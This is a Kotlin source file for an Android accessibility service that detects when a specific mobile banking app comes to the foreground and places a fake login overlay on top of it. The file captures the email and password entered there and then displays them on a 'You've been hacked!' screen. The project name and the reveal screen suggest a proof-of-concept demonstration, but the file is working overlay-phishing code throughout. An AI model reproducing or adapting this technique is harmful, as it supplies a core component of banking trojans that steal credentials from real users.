package com.malwaretest.overlayapp

import android.accessibilityservice.AccessibilityService
import android.graphics.PixelFormat
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.view.LayoutInflater
import android.view.accessibility.AccessibilityEvent
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView

class AppDetectionService : AccessibilityService() {

    private var windowManager: WindowManager? = null
    private var overlayView: View? = null
    private var hasShownOverlay = false


    companion object {
        private const val TAG = "Package Detection"
    }

    override fun onServiceConnected() {
        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val packageName = event.packageName?.toString()
            Log.d(TAG, "Current package name: $packageName")

            if (packageName == "com.ahmadsyuaib.androidmobilebankingapp") {
                if (!hasShownOverlay) {
                    showOverlay()
                    hasShownOverlay = true
                }
                Log.d(TAG, hasShownOverlay.toString())

            } else if (packageName == "com.malwaretest.overlayapp" && hasShownOverlay){

            } else if (packageName == "com.malwaretest.overlayapp" || packageName == "com.google.android.inputmethod.latin") {
                Log.d(TAG, hasShownOverlay.toString())

            } else {
                // Optional: Reset when leaving the target app
                hasShownOverlay = false
                removeOverlay()
                Log.d(TAG, hasShownOverlay.toString())
            }
        }
    }



    private fun showOverlay() {
        removeOverlay()

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_PHONE
            },
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
            PixelFormat.TRANSLUCENT
        )

        val inflater = LayoutInflater.from(this)
        overlayView = inflater.inflate(R.layout.overlay_layout, null)

        overlayView?.isFocusableInTouchMode = true
        overlayView?.requestFocus()

        val emailInput = overlayView?.findViewById<TextView>(R.id.email_input)
        val passwordInput = overlayView?.findViewById<TextView>(R.id.password_input)
        val loginButton = overlayView?.findViewById<View>(R.id.login_button)

        loginButton?.setOnClickListener {
            val email = emailInput?.text?.toString()?.trim().orEmpty()
            val password = passwordInput?.text?.toString()?.trim().orEmpty()
            showSuccessOverlay(email, password)
        }

        windowManager?.addView(overlayView, params)
    }




    private fun removeOverlay() {
        if (overlayView != null) {
            windowManager?.removeView(overlayView)
            overlayView = null
        }
    }

    private fun showSuccessOverlay(email: String, password: String) {
        removeOverlay()

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.WRAP_CONTENT,
            WindowManager.LayoutParams.WRAP_CONTENT,
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
            } else {
                @Suppress("DEPRECATION")
                WindowManager.LayoutParams.TYPE_PHONE
            },
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            PixelFormat.TRANSLUCENT
        )

        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(30, 20, 30, 20)
            setBackgroundColor(android.graphics.Color.parseColor("#AA000000"))
        }

        val successText = TextView(this).apply {
            text = "You've been hacked!"
            setTextColor(android.graphics.Color.WHITE)
            textSize = 18f
        }

        val emailText = TextView(this).apply {
            text = "Your email: $email"
            setTextColor(android.graphics.Color.WHITE)
            textSize = 16f
        }

        val passwordText = TextView(this).apply {
            text = "Your password: $password"
            setTextColor(android.graphics.Color.WHITE)
            textSize = 16f
        }

        val closeButton = Button(this).apply {
            text = "Close"
            setBackgroundColor(android.graphics.Color.parseColor("#2196F3"))
            setTextColor(android.graphics.Color.WHITE)
            setOnClickListener {
                removeOverlay()
            }
        }

        container.addView(successText)
        container.addView(emailText)
        container.addView(passwordText)
        container.addView(closeButton)

        overlayView = container
        windowManager?.addView(overlayView, params)
    }




    override fun onInterrupt() {}
}